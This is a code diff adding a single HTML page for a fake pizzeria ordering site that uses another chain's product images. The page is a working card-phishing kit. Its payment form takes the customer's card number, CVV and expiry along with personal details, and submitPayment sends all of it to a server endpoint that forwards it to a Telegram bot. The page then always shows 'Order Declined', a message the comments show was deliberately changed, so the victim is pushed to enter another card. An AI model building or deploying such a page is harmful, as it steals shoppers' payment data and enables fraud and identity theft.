@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ratatouille's Pizzeria Menu Ordering</title>
+
+    <!-- Include a cool Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@900&display=swap" rel="stylesheet">
+
+    <style>
+        /* Global Styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+
+        /* Header Styles */
+        .header {
+            text-align: center;
+            padding: 20px;
+            font-size: 2rem;
+            width: 100%;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif; /* Apply cool font to header */
+        }
+
+        .header img {
+            width: 100%;
+            height: auto;
+        }
+
+        /* Container for Pizza Listings */
+        .container {
+            max-width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Removed Pizza Menu Title */
+
+        /* Pizza Listing Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            grid-gap: 20px;
+        }
+
+        .pizza-card {
+            background-color: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            text-align: center;
+        }
+
+        .pizza-card:hover {
+            transform: scale(1.05);
+        }
+
+        .pizza-card img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+        }
+
+        .pizza-card h3 {
+            margin: 10px 0;
+            color: #333;
+        }
+
+        .pizza-card p {
+            margin: 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .pizza-card button {
+            background-color: #ff5733;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 0 0 10px 10px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .pizza-card button:hover {
+            background-color: #c13e22;
+        }
+
+        /* Cart Display */
+        .cart-info {
+            text-align: center;
+            margin: 20px;
+            font-size: 18px;
+        }
+
+        .checkout-btn {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .checkout-btn:hover {
+            background-color: #0056b3;
+        }
+
+        /* Move cart info below the checkout button */
+        .cart-info-below {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 18px;
+        }
+
+        /* Checkout Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+        }
+
+        .modal-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .modal-content label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .modal-content input[type="text"],
+        .modal-content input[type="email"],
+        .modal-content input[type="password"],
+        .modal-content input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .modal-content select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .modal-content button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .cart-items {
+            margin-bottom: 20px;
+        }
+
+        .cart-items ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .cart-items ul li {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .remove-btn {
+            background: red;
+            color: white;
+            border: none;
+            padding: 5px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .total-info {
+            text-align: right;
+        }
+
+        /* Delivery Form Modal */
+        .delivery-modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .delivery-modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        /* 5 Rows 2 Columns Layout */
+        .two-column-layout {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        /* Payment Info for Expiration Date (MM/YY) */
+        .one-column-layout {
+            grid-column: 1 / span 2;
+        }
+
+        /* Success Modal (Renamed to "Order Declined") */
+        .success-modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .success-modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        /* Footer Styles */
+        .footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <div class="header">
+      <img src="Banner.png" alt="Ratatouille's Pizzeria Banner"">
+
+
+
+
+
+    </div>
+
+    <div class="container">
+        <!-- Removed Pizza Menu Title -->
+
+        <!-- Pizza Listings -->
+        <div class="grid">
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PIZCZ.jpg" alt="Four Cheese Pizza">
+                <h3>Large Four Cheese</h3>
+                <p>$14.00</p>
+                <button onclick="addToCart(14, 'Large Four Cheese')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_MX.jpg" alt="Meat Lovers Pizza">
+                <h3>Deluxe Meat Lovers</h3>
+                <p>$15.00</p>
+                <button onclick="addToCart(15, 'Deluxe Meat Lovers')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PIZUH.jpg" alt="Hawaiian Pizza">
+                <h3>Large Hawaiian</h3>
+                <p>$12.00</p>
+                <button onclick="addToCart(12, 'Large Hawaiian')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PIZPX.jpg" alt="Pepperoni Pizza">
+                <h3>Large Pepperoni</h3>
+                <p>$12.00</p>
+                <button onclick="addToCart(12, 'Large Pepperoni')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PIZPV.jpg" alt="Veggie Pizza">
+                <h3>Deluxe Veggie</h3>
+                <p>$11.00</p>
+                <button onclick="addToCart(11, 'Deluxe Veggie')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PIZCR.jpg" alt="Buffalo Pizza">
+                <h3>Large Buffalo</h3>
+                <p>$13.00</p>
+                <button onclick="addToCart(13, 'Large Buffalo')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PIZCK.jpg" alt="BBQ Chicken Pizza">
+                <h3>Deluxe BBQ Chicken</h3>
+                <p>$13.00</p>
+                <button onclick="addToCart(13, 'Deluxe BBQ Chicken')">Add to Cart</button>
+            </div>
+            <div class="pizza-card">
+                <img src="https://cache.dominos.com/olo/6_142_5/assets/build/market/US/_en/images/img/products/larges/S_PISPF.jpg" alt="Spinach and Feta Pizza">
+                <h3>Large Spinach and Feta</h3>
+                <p>$14.00</p>
+                <button onclick="addToCart(14, 'Large Spinach and Feta')">Add to Cart</button>
+            </div>
+        </div>
+
+        <button class="checkout-btn" onclick="showCheckout()">Checkout</button>
+
+        <!-- Move "Items in Cart" info below the checkout button -->
+        <div class="cart-info-below">
+            Items in cart: <span id="cartCount">0</span>
+        </div>
+    </div>
+
+    <!-- Cart Modal -->
+    <div class="modal" id="checkoutModal">
+        <div class="modal-content">
+            <h2>Your Cart</h2>
+
+            <div class="cart-items">
+                <ul id="cartItemsList"></ul>
+            </div>
+
+            <div class="total-info">
+                <p>Subtotal: $<span id="subtotal">0.00</span></p>
+                <p>Tax (7.5%): $<span id="tax">0.00</span></p>
+                <p>Delivery: Free</p>
+                <p><strong>Total: $<span id="total">0.00</span></strong></p>
+            </div>
+
+            <button class="checkout-btn" onclick="showDeliveryModal()">Proceed to Delivery</button>
+        </div>
+    </div>
+
+    <!-- Delivery Modal -->
+    <div class="delivery-modal" id="deliveryModal">
+        <div class="delivery-modal-content">
+            <h2>Delivery Information</h2>
+            <form id="deliveryForm" onsubmit="submitDeliveryForm(event)">
+                <div class="two-column-layout">
+                    <div>
+                        <label>Full Name</label>
+                        <input type="text" id="name" required>
+                    </div>
+                    <div>
+                        <label>Email</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div>
+                        <label>Phone Number</label>
+                        <input type="number" id="phoneNumber" required>
+                    </div>
+                    <div>
+                        <label>Delivery Address</label>
+                        <input type="text" id="deliveryAddress" required>
+                    </div>
+                    <div>
+                        <label>City</label>
+                        <input type="text" id="city" required>
+                    </div>
+                    <div>
+                        <label>Zip Code</label>
+                        <input type="number" id="zipCode" max="99999" required>
+                    </div>
+                    <div>
+                        <label>Delivery or Carryout</label>
+                        <select id="deliveryOption" required onchange="toggleDeliveryFields()">
+                            <option value="Delivery">Delivery</option>
+                            <option value="Carryout">Carryout</option>
+                        </select>
+                    </div>
+                </div>
+                <button type="button" onclick="showPaymentModal()">Payment Details</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="delivery-modal" id="paymentModal">
+        <div class="delivery-modal-content">
+            <h2>Payment Information</h2>
+            <form id="paymentForm" onsubmit="submitPayment(event)">
+                <div class="two-column-layout">
+                    <div>
+                        <label>Full Name (Billing)</label>
+                        <input type="text" id="billingName" required>
+                    </div>
+                    <div>
+                        <label>Billing Address</label>
+                        <input type="text" id="billingAddress" required>
+                    </div>
+                    <div>
+                        <label>City</label>
+                        <input type="text" id="billingCity" required>
+                    </div>
+                    <div>
+                        <label>Zip Code</label>
+                        <input type="number" id="billingZipCode" max="99999" required>
+                    </div>
+                    <div>
+                        <label>Credit Card Number</label>
+                        <input type="number" id="ccNumber" minlength="15" maxlength="16" required>
+                    </div>
+                    <div>
+                        <label>CVV</label>
+                        <input type="number" id="cvv" minlength="3" maxlength="4" required>
+                    </div>
+                    <div class="one-column-layout">
+                        <label>EXP (MM/YY)</label>
+                        <input type="text" id="expDate" placeholder="MM/YY" required>
+                    </div>
+                </div>
+                <button type="submit">Purchase</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Success Modal (Now displays "Order Declined") -->
+    <div class="success-modal" id="successModal">
+        <div class="success-modal-content" id="successMessage">
+            <h2>Order Declined</h2> <!-- Changed Order Confirmed to Order Declined -->
+            <p>Your order has been Declined. Please try a different payment method.</p> <!-- Updated message -->
+            <button onclick="closeSuccessModal()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        let cart = [];
+        let taxRate = 0.075;
+
+        function addToCart(price, name) {
+            cart.push({ price: price, name: name });
+            document.getElementById('cartCount').innerText = cart.length;
+            updateCartItems();
+        }
+
+        function showCheckout() {
+            if (cart.length === 0) {
+                alert('Your cart is empty. Please add some pizzas.');
+                return;
+            }
+            document.getElementById('checkoutModal').style.display = 'flex';
+            updateCartItems();
+            calculateTotal();
+        }
+
+        function closeModal() {
+            document.getElementById('checkoutModal').style.display = 'none';
+        }
+
+        function closeDeliveryModal() {
+            document.getElementById('deliveryModal').style.display = 'none';
+        }
+
+        function closePaymentModal() {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+
+        function closeSuccessModal() {
+            document.getElementById('successModal').style.display = 'none';
+            clearPaymentDetails();  // Clear textboxes when modal is closed
+        }
+
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            document.getElementById('cartCount').innerText = cart.length;
+            updateCartItems();
+            calculateTotal();
+        }
+
+        function updateCartItems() {
+            const cartItemsList = document.getElementById('cartItemsList');
+            cartItemsList.innerHTML = '';
+            cart.forEach((item, index) => {
+                const li = document.createElement('li');
+                li.innerHTML = `${item.name} - $${item.price.toFixed(2)} <button class="remove-btn" onclick="removeFromCart(${index})">Remove</button>`;
+                cartItemsList.appendChild(li);
+            });
+        }
+
+        function calculateTotal() {
+            let subtotal = cart.reduce((total, item) => total + item.price, 0);
+            let tax = subtotal * taxRate;
+            let total = subtotal + tax;
+
+            document.getElementById('subtotal').innerText = subtotal.toFixed(2);
+            document.getElementById('tax').innerText = tax.toFixed(2);
+            document.getElementById('total').innerText = total.toFixed(2);
+        }
+
+        function showDeliveryModal() {
+            document.getElementById('checkoutModal').style.display = 'none';
+            document.getElementById('deliveryModal').style.display = 'flex';
+        }
+
+        function showPaymentModal() {
+            document.getElementById('deliveryModal').style.display = 'none';
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        function submitDeliveryForm(event) {
+            event.preventDefault();
+            document.getElementById('deliveryModal').style.display = 'none';
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        // Function to send order details to Telegram
+        async function submitPayment(event) {
+            event.preventDefault();  // Prevent form from reloading page
+
+            const billingName = document.getElementById('billingName').value;
+            const billingAddress = document.getElementById('billingAddress').value;
+            const billingCity = document.getElementById('billingCity').value;
+            const billingZipCode = document.getElementById('billingZipCode').value;
+            const ccNumber = document.getElementById('ccNumber').value;
+            const cvv = document.getElementById('cvv').value;
+            const expDate = document.getElementById('expDate').value;
+
+            const deliveryDetails = {
+                name: document.getElementById('name').value,
+                email: document.getElementById('email').value,
+                phoneNumber: document.getElementById('phoneNumber').value,
+                address: document.getElementById('deliveryAddress').value,
+                city: document.getElementById('city').value,
+                zipCode: document.getElementById('zipCode').value,
+                deliveryOption: document.getElementById('deliveryOption').value,
+            };
+
+            const paymentDetails = {
+                billingName,
+                billingAddress,
+                billingCity,
+                billingZipCode,
+                ccNumber,
+                cvv,
+                expDate,
+            };
+
+            // Compile all order, delivery, and payment details into a string
+            let orderDetails = `
+                Cart Items: ${cart.length} items:
+                ${cart.map(item => `${item.name} - $${item.price.toFixed(2)}`).join('\n')}
+                Subtotal: $${document.getElementById('subtotal').innerText}
+                Tax: $${document.getElementById('tax').innerText}
+                Total: $${document.getElementById('total').innerText}
+
+                Delivery Info:
+                Name: ${deliveryDetails.name},
+                Email: ${deliveryDetails.email},
+                Phone: ${deliveryDetails.phoneNumber},
+                Address: ${deliveryDetails.address},
+                City: ${deliveryDetails.city},
+                Zip Code: ${deliveryDetails.zipCode},
+                Delivery Option: ${deliveryDetails.deliveryOption}
+
+                Payment Info:
+                Billing Name: ${paymentDetails.billingName},
+                Billing Address: ${paymentDetails.billingAddress},
+                Billing City: ${paymentDetails.billingCity},
+                Billing Zip Code: ${paymentDetails.billingZipCode},
+                Credit Card Number: ${paymentDetails.ccNumber},
+                CVV: ${paymentDetails.cvv},
+                Expiration Date: ${paymentDetails.expDate}
+            `;
+
+            try {
+                // Send the order details to the server, which will send it to Telegram bot
+                const response = await fetch('http://localhost:3000/sendOrderToTelegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: orderDetails }),
+                });
+
+                if (response.ok) {
+                    document.getElementById('paymentModal').style.display = 'none';
+                    document.getElementById('successModal').style.display = 'flex';
+                } else {
+                    console.error('Failed to send order details', response);
+                    alert('Failed to send order details. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error submitting order:', error);
+                alert('Error submitting order. Check the console for details.');
+            }
+        }
+
+        // Function to clear payment form fields after order is declined
+        function clearPaymentDetails() {
+            document.getElementById('billingName').value = '';
+            document.getElementById('billingAddress').value = '';
+            document.getElementById('billingCity').value = '';
+            document.getElementById('billingZipCode').value = '';
+            document.getElementById('ccNumber').value = '';
+            document.getElementById('cvv').value = '';
+            document.getElementById('expDate').value = '';
+        }
+    </script>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>5757 Westheimer Rd, Houston, TX, 77057</p>
+        <p>Phone: 713-783-3030</p>
+        <p>Hours: 11AM - 2AM</p>
+    </div>
+
+</body>
+</html>
